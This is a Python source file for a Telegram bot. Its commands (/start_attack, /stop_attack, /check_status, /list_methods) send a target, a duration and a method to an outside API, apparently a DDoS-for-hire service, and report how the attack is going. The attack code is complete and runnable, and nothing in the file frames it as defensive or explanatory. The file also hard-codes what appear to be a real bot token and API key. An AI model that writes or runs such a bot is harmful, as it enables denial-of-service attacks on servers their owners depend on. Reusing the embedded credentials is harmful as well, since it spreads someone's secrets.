import logging
import requests
from telegram import Update, ForceReply
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
TELEGRAM_BOT_TOKEN = '7814912313:AAHyhW2b17XHgfcyw-26wQSKHZSpCpM9uTs'

# Replace 'YOUR_API_KEY' with your actual API key
API_KEY = '38698f04-75e1-4bb6-904e-17850e4ca52d'

BASE_URL = 'https://vire.cc/api/v1'

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    await update.message.reply_html(
        rf'Hi {user.mention_html()}!',
        reply_markup=ForceReply(selective=True),
    )

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text('Help!')

async def start_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    target = context.args[0] if context.args else None
    time = context.args[1] if len(context.args) > 1 else '60'
    method = context.args[2] if len(context.args) > 2 else 'HTTP'

    if not target:
        await update.message.reply_text('Please provide a target. Usage: /start_attack <target> [time] [method]')
        return

    response = requests.post(f'{BASE_URL}/start', json={
        'user': API_KEY,
        'target': target,
        'time': time,
        'method': method
    })

    if response.status_code == 200:
        data = response.json()
        if data['success']:
            await update.message.reply_text(f'Attack started successfully: {data["data"]}')
        else:
            await update.message.reply_text(f'Error starting attack: {data["error"]}')
    else:
        await update.message.reply_text(f'Failed to start attack. HTTP Status: {response.status_code}')

async def stop_attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    attack_id = context.args[0] if context.args else None

    if attack_id:
        response = requests.get(f'{BASE_URL}/stop', params={
            'user': API_KEY,
            'attack_id': attack_id
        })
    else:
        response = requests.get(f'{BASE_URL}/stop', params={
            'user': API_KEY
        })

    if response.status_code == 200:
        data = response.json()
        if data['success']:
            await update.message.reply_text(f'Attack stopped successfully: {data["data"]}')
        else:
            await update.message.reply_text(f'Error stopping attack: {data["error"]}')
    else:
        await update.message.reply_text(f'Failed to stop attack. HTTP Status: {response.status_code}')

async def check_status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    attack_id = context.args[0] if context.args else None

    if attack_id:
        response = requests.get(f'{BASE_URL}/status', params={
            'user': API_KEY,
            'attack_id': attack_id
        })
    else:
        response = requests.get(f'{BASE_URL}/status', params={
            'user': API_KEY
        })

    if response.status_code == 200:
        data = response.json()
        if data['success']:
            await update.message.reply_text(f'Attack status: {data["data"]}')
        else:
            await update.message.reply_text(f'Error checking status: {data["error"]}')
    else:
        await update.message.reply_text(f'Failed to check status. HTTP Status: {response.status_code}')

async def list_methods(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = requests.get(f'{BASE_URL}/methods')

    if response.status_code == 200:
        data = response.json()
        if data['success']:
            methods = ', '.join(data['data'])
            await update.message.reply_text(f'Available methods: {methods}')
        else:
            await update.message.reply_text(f'Error listing methods: {data["error"]}')
    else:
        await update.message.reply_text(f'Failed to list methods. HTTP Status: {response.status_code}')

async def user_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = requests.get(f'{BASE_URL}/user', params={'user': API_KEY})

    if response.status_code == 200:
        data = response.json()
        if data['success']:
            await update.message.reply_text(f'User information: {data["data"]}')
        else:
            await update.message.reply_text(f'Error retrieving user information: {data["error"]}')
    else:
        await update.message.reply_text(f'Failed to retrieve user information. HTTP Status: {response.status_code}')

async def server_stats(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = requests.get(f'{BASE_URL}/stats')

    if response.status_code == 200:
        data = response.json()
        if data['success']:
            await update.message.reply_text(f'Server statistics: {data["data"]}')
        else:
            await update.message.reply_text(f'Error retrieving server statistics: {data["error"]}')
    else:
        await update.message.reply_text(f'Failed to retrieve server statistics. HTTP Status: {response.status_code}')

def main() -> None:
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("start_attack", start_attack))
    application.add_handler(CommandHandler("stop_attack", stop_attack))
    application.add_handler(CommandHandler("check_status", check_status))
    application.add_handler(CommandHandler("list_methods", list_methods))
    application.add_handler(CommandHandler("user_info", user_info))
    application.add_handler(CommandHandler("server_stats", server_stats))

    application.run_polling()

if __name__ == '__main__':
    main()
